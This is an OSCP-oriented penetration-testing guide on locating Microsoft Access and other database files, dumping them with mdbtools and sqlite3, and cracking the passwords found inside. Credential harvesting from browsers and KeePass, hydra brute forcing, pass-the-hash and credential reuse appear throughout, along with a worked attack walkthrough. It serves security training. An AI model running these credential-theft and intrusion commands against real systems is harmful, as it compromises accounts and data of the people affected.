# .mdb (Microsoft Access Database) — Complete OSCP Guide

> **Scope:** Full methodology for dealing with .mdb files in pentesting — what they are, how to find them, how to read them on Linux without Microsoft Access, extract credentials, crack passwords, and use found data to pivot further. Written for the OSCP mindset: you find a .mdb file, you drain it completely.

---

## Table of Contents

1. [What is a .mdb File](#1-what-is-a-mdb-file)
   - 1.1 Concept & Background
   - 1.2 Why .mdb Files Appear in OSCP/CTF
   - 1.3 What .mdb Files Contain
   - 1.4 File Format Variants

2. [Finding .mdb Files](#2-finding-mdb-files)
   - 2.1 On Linux Target
   - 2.2 On Windows Target
   - 2.3 Via Web / FTP / SMB

3. [Reading .mdb on Linux — Tools](#3-reading-mdb-on-linux--tools)
   - 3.1 mdbtools — Primary Tool
   - 3.2 Install mdbtools
   - 3.3 List All Tables
   - 3.4 Export Table Data
   - 3.5 Dump Everything

4. [Reading .mdb on Windows](#4-reading-mdb-on-windows)
   - 4.1 Microsoft Access (GUI)
   - 4.2 mdb-viewer-plus
   - 4.3 Command Line on Windows

5. [Extracting Credentials](#5-extracting-credentials)
   - 5.1 Find Password Tables
   - 5.2 Search All Tables for Keywords
   - 5.3 Common Table/Column Names

6. [Cracking .mdb Passwords](#6-cracking-mdb-passwords)
   - 6.1 Access Database Password (File-level)
   - 6.2 Crack with office2john + john
   - 6.3 Crack with hashcat

7. [Using Found Credentials](#7-using-found-credentials)
   - 7.1 Credential Reuse — SSH, RDP, FTP
   - 7.2 Found Hash — Crack or Pass-the-Hash
   - 7.3 Connection Strings in .mdb

8. [Similar Database Files in OSCP](#8-similar-database-files-in-oscp)
   - 8.1 .sqlite / .sqlite3 / .db
   - 8.2 .accdb (Access 2007+)
   - 8.3 MySQL Dump Files (.sql)
   - 8.4 KeePass Files (.kdbx)
   - 8.5 Password Manager Files

9. [Full Attack Walkthrough](#9-full-attack-walkthrough)

10. [Quick Reference Card](#10-quick-reference-card)

---

## 1. What is a .mdb File

### 1.1 Concept & Background

**.mdb** stands for **Microsoft Database**. It is the file format used by **Microsoft Access**, a desktop database application included in older Microsoft Office suites.

- Extension: `.mdb` (Access 97–2003), `.accdb` (Access 2007+)
- Contains: tables, queries, forms, reports, VBA macros
- Self-contained: entire database in ONE file
- No server needed: runs standalone unlike MySQL/PostgreSQL

```
Microsoft Access (.mdb)
    │
    ├── Tables      → rows and columns of data (like Excel sheets)
    ├── Queries     → saved SQL queries
    ├── Forms       → GUI input forms
    ├── Reports     → print layouts
    └── Macros/VBA  → automation code
```

### 1.2 Why .mdb Files Appear in OSCP/CTF

.mdb files show up because:

- **Legacy applications** — older business software stored everything in Access
- **Simple credential stores** — small apps stored usernames/passwords in Access
- **Configuration databases** — app settings including DB connection strings
- **Network device management** — Cisco, HP, and other gear used Access for config export
- **Backup files** — exported data sitting on file shares or FTP
- **Web app backends** — old ASP/ASP.NET sites used Access as database

**In OSCP specifically:** You will find .mdb files that contain:
- **Plaintext or hashed passwords** for system users
- **Connection strings** with credentials for other databases
- **Application usernames/passwords** that reuse system credentials

### 1.3 What .mdb Files Contain (Pentester's View)

| Content | Pentest Value |
|---|---|
| User table with passwords | Direct credential extraction |
| Password hashes | Crack offline with john/hashcat |
| DB connection strings | Pivot to other databases |
| Email addresses | Username enumeration |
| VPN/network credentials | Network access |
| API keys / tokens | Application access |
| Internal hostnames/IPs | Network mapping |

### 1.4 File Format Variants

| Extension | Format | Tool to Open |
|---|---|---|
| `.mdb` | Access 97-2003 | mdbtools, MS Access |
| `.accdb` | Access 2007+ | mdbtools (partial), MS Access |
| `.ldb` | Lock file (Access open) | Ignore — not the database |
| `.accde` | Compiled Access (no design) | MS Access only |

---

## 2. Finding .mdb Files

### 2.1 On Linux Target

```bash
# Find all .mdb files
find / -name "*.mdb" 2>/dev/null
find / -name "*.accdb" 2>/dev/null

# Find in common locations
find /var /srv /opt /home /tmp -name "*.mdb" 2>/dev/null

# Find recently modified database files
find / -name "*.mdb" -newer /etc/passwd 2>/dev/null

# Find by file type (magic bytes) even if extension wrong
find / -type f -exec file {} \; 2>/dev/null | grep -i "microsoft access"

# Find in web directories
find /var/www -name "*.mdb" 2>/dev/null
find /var/www -name "*.accdb" 2>/dev/null
```

### 2.2 On Windows Target

```cmd
# Search entire C: drive
dir /s /b C:\*.mdb 2>nul
dir /s /b C:\*.accdb 2>nul

# Common locations to check manually
dir C:\inetpub\wwwroot\*.mdb
dir C:\inetpub\wwwroot\*.accdb
dir "C:\Program Files\*.mdb" /s
dir C:\Users\*.mdb /s
dir C:\Windows\Temp\*.mdb /s
dir C:\*.mdb /s

# PowerShell — recursive search
Get-ChildItem -Path C:\ -Include "*.mdb","*.accdb" -Recurse -ErrorAction SilentlyContinue

# PowerShell — with full path
Get-ChildItem -Path C:\ -Include "*.mdb" -Recurse -EA SilentlyContinue | Select-Object FullName
```

### 2.3 Via Web / FTP / SMB

```bash
# Web — sometimes .mdb files are directly accessible via browser!
# Try these common paths:
curl http://<TARGET_IP>/db/database.mdb
curl http://<TARGET_IP>/data/database.mdb
curl http://<TARGET_IP>/backup/db.mdb
curl http://<TARGET_IP>/app/database.mdb

# Download if accessible
wget http://<TARGET_IP>/database.mdb
curl http://<TARGET_IP>/database.mdb -o database.mdb

# Check web source for .mdb references
curl http://<TARGET_IP>/ | grep -i "\.mdb"

# FTP — look in all directories
ftp <TARGET_IP>
ftp> ls -laR      # recursive listing, look for .mdb files
ftp> get database.mdb

# SMB
smbclient //<TARGET_IP>/share -U user
smb> ls
smb> get database.mdb

# Download via SCP if SSH available
scp user@<TARGET_IP>:/var/www/html/database.mdb .
scp user@<TARGET_IP>:/opt/app/data.mdb .
```

---

## 3. Reading .mdb on Linux — Tools

### 3.1 mdbtools — Primary Tool

**mdbtools** is the standard Linux toolkit for reading .mdb files without Microsoft Access.

It includes:
| Command | What It Does |
|---|---|
| `mdb-tables` | List all table names in the database |
| `mdb-export` | Export a table to CSV |
| `mdb-schema` | Show database schema (column names, types) |
| `mdb-sql` | Run SQL queries against the database |
| `mdb-ver` | Show the Access version of the file |
| `mdb-count` | Count rows in a table |
| `mdb-prop` | Show database properties |

### 3.2 Install mdbtools

```bash
# Kali / Ubuntu / Debian
sudo apt install mdbtools

# Verify
mdb-tables --help
mdb-export --help
```

### 3.3 List All Tables

```bash
# List all tables in the database
mdb-tables database.mdb

# One table per line (easier to read)
mdb-tables -1 database.mdb

# Example output:
# Users
# Passwords
# Config
# Products
# Orders
# SystemSettings

# Show database version
mdb-ver database.mdb
# Jet 4

# Show full schema (all tables + columns)
mdb-schema database.mdb
```

### 3.4 Export Table Data

```bash
# Export a specific table to CSV
mdb-export database.mdb Users

# Export and save to file
mdb-export database.mdb Users > users.csv

# Export with headers visible
mdb-export database.mdb Users | head -20

# Export all tables
for table in $(mdb-tables -1 database.mdb); do
    echo "=== TABLE: $table ==="
    mdb-export database.mdb "$table"
    echo ""
done

# Export to file
for table in $(mdb-tables -1 database.mdb); do
    mdb-export database.mdb "$table" > "${table}.csv"
done

# Example output from Users table:
# Id,Username,Password,Email
# 1,admin,5f4dcc3b5aa765d61d8327deb882cf99,admin@example.com
# 2,charix,xWc36szQA7,charix@example.com
# 3,root,toor,root@localhost
```

### 3.5 Dump Everything

```bash
# One command — dump ALL tables
mdb-tables -1 database.mdb | while read table; do
    echo ""
    echo "=========================================="
    echo " TABLE: $table"
    echo "=========================================="
    mdb-export database.mdb "$table"
done

# Save everything to one file
mdb-tables -1 database.mdb | while read table; do
    echo "=== $table ===" >> full_dump.txt
    mdb-export database.mdb "$table" >> full_dump.txt
done

# Search dump for keywords
cat full_dump.txt | grep -i "password\|passwd\|pass\|secret\|key\|token"

# Use mdb-sql for specific queries
mdb-sql database.mdb << EOF
SELECT * FROM Users;
EOF

# Or interactive
mdb-sql database.mdb
# MDB> SELECT * FROM Users;
# MDB> SELECT Username, Password FROM Users WHERE Username='admin';
# MDB> quit

# Get schema only (column names — useful first step)
mdb-schema database.mdb | grep -i "CREATE TABLE" -A 20
```

---

## 4. Reading .mdb on Windows

### 4.1 Microsoft Access (GUI)

If you have a Windows machine with MS Access installed:
1. Double-click the `.mdb` file
2. Navigate to Tables in the left panel
3. Double-click any table to view data
4. Use Ctrl+C to copy data out

### 4.2 mdb-viewer-plus

Free GUI tool for Windows — no MS Access needed:

```
Download: https://github.com/marin-m/mdb-viewer-plus
→ Open .mdb file
→ Click each table to view contents
→ Export to CSV
```

### 4.3 Command Line on Windows

```cmd
# If mdbtools is installed on Windows (uncommon):
mdb-tables database.mdb
mdb-export database.mdb Users

# PowerShell — read .mdb via OLEDB (if Access drivers installed)
powershell -c "
\$conn = New-Object System.Data.OleDb.OleDbConnection
\$conn.ConnectionString = 'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=database.mdb'
\$conn.Open()
\$cmd = \$conn.CreateCommand()
\$cmd.CommandText = 'SELECT * FROM Users'
\$reader = \$cmd.ExecuteReader()
while(\$reader.Read()) { Write-Host \$reader[0] \$reader[1] \$reader[2] }
\$conn.Close()
"
```

---

## 5. Extracting Credentials

### 5.1 Find Password Tables

```bash
# Step 1 — List all tables
mdb-tables -1 database.mdb

# Step 2 — Identify interesting tables
mdb-tables -1 database.mdb | grep -i "user\|pass\|admin\|login\|account\|auth\|cred"

# Step 3 — Export interesting tables
mdb-export database.mdb Users
mdb-export database.mdb Passwords
mdb-export database.mdb Admin
mdb-export database.mdb Accounts
mdb-export database.mdb Login

# Step 4 — Get schema first (see column names)
mdb-schema database.mdb | grep -i "pass\|user\|auth" -B 5 -A 5
```

### 5.2 Search All Tables for Keywords

```bash
# Dump everything then search
mdb-tables -1 database.mdb | while read t; do
    mdb-export database.mdb "$t" 2>/dev/null
done | grep -i "pass\|secret\|admin\|root\|hash\|token\|key"

# Search for common hash patterns (MD5, SHA1, bcrypt)
mdb-tables -1 database.mdb | while read t; do
    mdb-export database.mdb "$t" 2>/dev/null
done | grep -E "[a-f0-9]{32}|[a-f0-9]{40}|\$2[ayb]\$"

# Save full dump and search
mdb-tables -1 database.mdb | while read t; do
    mdb-export database.mdb "$t" 2>/dev/null
done > /tmp/mdb_dump.txt

grep -i "password" /tmp/mdb_dump.txt
grep -i "username\|user_name\|login" /tmp/mdb_dump.txt
grep -E "[a-f0-9]{32}" /tmp/mdb_dump.txt  # MD5 hashes
grep -E "[a-f0-9]{40}" /tmp/mdb_dump.txt  # SHA1 hashes
```

### 5.3 Common Table/Column Names

Look for these table names:

```
Users          Accounts       Login          Members
Passwords      AdminUsers     Credentials    Staff
tblUsers       tblPasswords   tblAccounts    SystemUsers
UserData       AuthUsers      AppUsers       Config
Settings       SystemConfig   Parameters     Properties
```

Look for these column names:

```
Password       Pass           Passwd         pwd
PasswordHash   PassHash       HashValue      MD5Password
Username       UserName       Login          LoginName
Email          UserID         AdminPass      SecretKey
APIKey         Token          ConnectionString
```

---

## 6. Cracking .mdb Passwords

### 6.1 Access Database Password (File-level)

Microsoft Access allows setting a **database password** that encrypts the file. If the .mdb is password-protected, you need to crack it before mdbtools can read it.

```bash
# Test if database is password protected
mdb-tables database.mdb
# If error: "Error: file is not a valid MDB file" or similar → may be encrypted

# Try opening with mdbtools anyway (some encryption is weak)
mdb-export database.mdb Users 2>&1
```

### 6.2 Crack with office2john + john

```bash
# Extract hash from .mdb file
office2john database.mdb > mdb.hash
cat mdb.hash

# Crack with john
john mdb.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked password
john mdb.hash --show

# If office2john doesn't support .mdb, use:
# accdb-hash extractor (for .accdb)
# or try accesschk.py from GitHub
```

### 6.3 Crack with hashcat

```bash
# First identify hash mode
hashcat --help | grep -i "access\|office"

# MS Access 97-2003 — mode 9700
hashcat -m 9700 mdb.hash /usr/share/wordlists/rockyou.txt

# MS Office 2007 (.accdb) — mode 9400
hashcat -m 9400 accdb.hash /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 9700 mdb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 6.4 Crack Hashes Found INSIDE the Database

Once you extract data from the .mdb, the passwords themselves may be hashed:

```bash
# Identify hash type
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
# → MD5

# Crack MD5 with john
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5

# Crack with hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt     # MD5
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt   # SHA1
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt  # bcrypt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM

# Crack multiple hashes at once
mdb-export database.mdb Users | cut -d',' -f3 | tail -n +2 > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Online cracking (for CTF — not real engagements)
# crackstation.net
# hashes.com
```

---

## 7. Using Found Credentials

### 7.1 Credential Reuse — SSH, RDP, FTP

```bash
# Found: username=charix, password=xWc36szQA7

# Try SSH
ssh charix@<TARGET_IP>
ssh charix@<TARGET_IP> -o StrictHostKeyChecking=no

# Try RDP
xfreerdp /u:charix /p:xWc36szQA7 /v:<TARGET_IP> /cert:ignore

# Try FTP
ftp <TARGET_IP>
# Username: charix  Password: xWc36szQA7

# Try SMB
smbclient -L //<TARGET_IP> -U charix%xWc36szQA7

# Try multiple found accounts at once
hydra -L found_users.txt -P found_passwords.txt <TARGET_IP> ssh
hydra -L found_users.txt -P found_passwords.txt <TARGET_IP> ftp
```

### 7.2 Found Hash — Crack or Pass-the-Hash

```bash
# If hash is NTLM (Windows) → Pass-the-Hash
evil-winrm -i <TARGET_IP> -u Administrator -H "NTLM_HASH"
impacket-psexec Administrator@<TARGET_IP> -hashes :NTLM_HASH

# Crack first with hashcat
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt

# If MD5 → crack and reuse
john md5.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
```

### 7.3 Connection Strings in .mdb

Sometimes .mdb files contain connection strings to OTHER databases:

```bash
# Look for connection strings
grep -i "server=\|data source=\|dsn=\|connectionstring" /tmp/mdb_dump.txt

# Example found string:
# Server=192.168.1.50;Database=AppDB;User Id=sa;Password=SqlPass123;

# Use found creds to connect to SQL Server
impacket-mssqlclient sa:SqlPass123@192.168.1.50

# MySQL connection string found
# Host=192.168.1.60;Database=webapp;Uid=root;Pwd=mysql_pass;
mysql -h 192.168.1.60 -u root -p'mysql_pass'
```

---

## 8. Similar Database Files in OSCP

These files appear just as often as .mdb in OSCP/CTF machines. Same mindset: find → download → read → extract creds.

### 8.1 .sqlite / .sqlite3 / .db

SQLite — single file database, very common in Linux apps, web apps, mobile apps.

```bash
# Find
find / -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.db" 2>/dev/null

# Read with sqlite3 (usually installed)
sqlite3 database.sqlite

# Inside sqlite3 prompt:
.tables                    # list all tables
.schema Users              # show table structure
SELECT * FROM Users;       # dump table
SELECT * FROM users LIMIT 10;
.mode csv                  # CSV output
.output dump.csv           # save to file
SELECT * FROM users;
.quit

# One-liner dump all tables
sqlite3 database.sqlite ".tables" | tr ' ' '\n' | while read t; do
    echo "=== $t ==="
    sqlite3 database.sqlite "SELECT * FROM $t;"
done

# Search for passwords
sqlite3 database.sqlite "SELECT * FROM users;"
sqlite3 database.sqlite "SELECT username, password FROM users;"

# Common SQLite files to look for
find / -name "*.db" 2>/dev/null | grep -v proc
# web apps:     /var/www/html/app.db
# Django:       db.sqlite3
# Firefox:      ~/.mozilla/firefox/*/key*.db, logins.json
# Chrome:       ~/.config/google-chrome/Default/Login\ Data
# KeePass:      *.kdbx (different format — see below)
```

### 8.2 .accdb (Access 2007+)

Newer Access format — mdbtools has partial support:

```bash
# mdbtools works on most .accdb files
mdb-tables database.accdb
mdb-export database.accdb Users

# If mdbtools fails on .accdb
# Use wine + MS Access, or transfer to Windows machine

# Check version
mdb-ver database.accdb
```

### 8.3 MySQL Dump Files (.sql)

Raw SQL dump files — read with grep, no tool needed:

```bash
# Find
find / -name "*.sql" 2>/dev/null

# Read directly
cat database.sql | grep -i "INSERT INTO"
cat database.sql | grep -i "password\|passwd"

# Look for user inserts
grep -i "INSERT INTO.*user\|INSERT INTO.*account\|INSERT INTO.*admin" database.sql

# Import and query (if MySQL available)
mysql -u root -p < database.sql
mysql -u root -p -e "SHOW DATABASES; USE appdb; SELECT * FROM users;"
```

### 8.4 KeePass Files (.kdbx)

KeePass password manager database — gold mine if found.

```bash
# Find
find / -name "*.kdbx" 2>/dev/null
find / -name "*.kdb" 2>/dev/null

# Crack master password
keepass2john database.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt

# hashcat
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt

# After cracking — open with keepassxc
keepassxc database.kdbx
# Enter cracked master password → see all stored credentials
```

### 8.5 Password Manager Files

```bash
# 1Password (.agilekeychain, .1pif)
find / -name "*.agilekeychain" -o -name "*.1pif" 2>/dev/null

# LastPass (local export .csv)
find / -name "lastpass*.csv" 2>/dev/null

# Firefox saved passwords
find / -name "logins.json" 2>/dev/null
# Use: firefox_decrypt.py to extract
wget https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py
python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE_DIR/

# Chrome saved passwords
find / -path "*/Chrome/*/Login Data" 2>/dev/null
find / -path "*/Chromium/*/Login Data" 2>/dev/null
# Use: chrome-password extractor tool or manually with sqlite3
sqlite3 "Login Data" "SELECT origin_url,username_value,password_value FROM logins;"
# Note: Chrome passwords are encrypted — need the key

# Generic credential files
find / -name "credentials*" -o -name "passwords*" -o -name "creds*" 2>/dev/null
find / -name "*.credentials" 2>/dev/null
```

---

## 9. Full Attack Walkthrough

**Scenario:** You access an FTP server anonymously and find a `backup.mdb` file.

**Step 1 — Find the file:**
```bash
ftp <TARGET_IP>
# anonymous / anonymous
ftp> ls -la
# -rw-r--r-- backup.mdb
ftp> binary
ftp> get backup.mdb
ftp> bye
```

**Step 2 — Confirm it's a valid .mdb:**
```bash
file backup.mdb
# backup.mdb: Microsoft Access Database

mdb-ver backup.mdb
# Jet 4
```

**Step 3 — List all tables:**
```bash
mdb-tables -1 backup.mdb
# Config
# Users
# Products
# AdminAccounts
# SystemLog
```

**Step 4 — Dump interesting tables:**
```bash
mdb-export backup.mdb Users
# Id,Username,Password,IsAdmin
# 1,admin,21232f297a57a5a743894a0e4a801fc3,1
# 2,charix,xWc36szQA7,0
# 3,guest,,0

mdb-export backup.mdb AdminAccounts
# Id,Username,PasswordHash,Salt
# 1,administrator,5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8,abc123
```

**Step 5 — Identify and crack hashes:**
```bash
hash-identifier "21232f297a57a5a743894a0e4a801fc3"
# MD5

echo "21232f297a57a5a743894a0e4a801fc3" > hash.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
# admin → admin (cracked instantly — it's MD5 of "admin")

# Plaintext found: charix:xWc36szQA7
```

**Step 6 — Credential reuse:**
```bash
ssh charix@<TARGET_IP>
# password: xWc36szQA7
# Login successful! ✅
```

**Step 7 — Check Config table:**
```bash
mdb-export backup.mdb Config
# Key,Value
# db_host,192.168.1.50
# db_user,root
# db_pass,Sup3rS3cr3t!
# db_name,production
```

**Step 8 — Use DB credentials:**
```bash
# Create tunnel if needed
ssh -L 3306:192.168.1.50:3306 charix@<TARGET_IP> -N &
mysql -h 127.0.0.1 -u root -p'Sup3rS3cr3t!'
```

**Step 9 — Get flags:**
```bash
cat /home/charix/user.txt
# flag content ✅

sudo -l
# Found sudo entry → escalate to root → cat /root/root.txt ✅
```

---

## 10. Quick Reference Card

```
====================================================================
 .MDB & DATABASE FILES — OSCP QUICK REFERENCE
====================================================================

[FIND .MDB FILES]
  find / -name "*.mdb" -o -name "*.accdb" 2>/dev/null   (Linux)
  dir /s /b C:\*.mdb 2>nul                               (Windows)

[MDBTOOLS WORKFLOW]
  mdb-ver database.mdb             → check version
  mdb-tables -1 database.mdb       → list all tables
  mdb-schema database.mdb          → show all columns
  mdb-export database.mdb Users    → dump Users table
  mdb-sql database.mdb             → SQL prompt

[DUMP ALL TABLES]
  mdb-tables -1 db.mdb | while read t; do
      echo "=== $t ===" && mdb-export db.mdb "$t"
  done

[SEARCH FOR PASSWORDS]
  mdb-tables -1 db.mdb | while read t; do
      mdb-export db.mdb "$t" 2>/dev/null
  done | grep -i "pass\|secret\|admin\|hash"

[CRACK FILE PASSWORD]
  office2john database.mdb > hash.txt
  john hash.txt --wordlist=rockyou.txt
  hashcat -m 9700 hash.txt rockyou.txt

[CRACK FOUND HASHES]
  hash-identifier "HASH"           → identify type
  john hash.txt --format=raw-md5 --wordlist=rockyou.txt
  hashcat -m 0 hash.txt rockyou.txt    (MD5)
  hashcat -m 100 hash.txt rockyou.txt  (SHA1)
  hashcat -m 1000 hash.txt rockyou.txt (NTLM)

[USE FOUND CREDS]
  ssh user@<TARGET_IP>
  xfreerdp /u:user /p:pass /v:<TARGET_IP> /cert:ignore
  ftp <TARGET_IP>

--------------------------------------------------------------------
[SQLITE]
  sqlite3 database.db
  .tables
  SELECT * FROM users;
  .quit

  One-liner: sqlite3 db.db ".tables" | tr ' ' '\n' | \
             while read t; do sqlite3 db.db "SELECT * FROM $t;"; done

[KEEPASS .kdbx]
  keepass2john db.kdbx > hash.txt
  john hash.txt --wordlist=rockyou.txt
  keepassxc db.kdbx  (GUI after cracking)

[SQL DUMP .sql]
  grep -i "INSERT INTO.*user" dump.sql
  grep -i "password\|passwd" dump.sql

[FIREFOX PASSWORDS]
  find / -name "logins.json" 2>/dev/null
  python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE/

[PRIORITY — what to look for in .mdb]
  1. Users/Passwords table     → direct creds
  2. Config/Settings table     → DB connection strings
  3. AdminAccounts table       → privileged creds
  4. Hash columns              → crack offline
====================================================================
```

---

*This document is for authorized penetration testing, OSCP exam preparation, and CTF competitions only. Always obtain written permission before testing systems you do not own.*
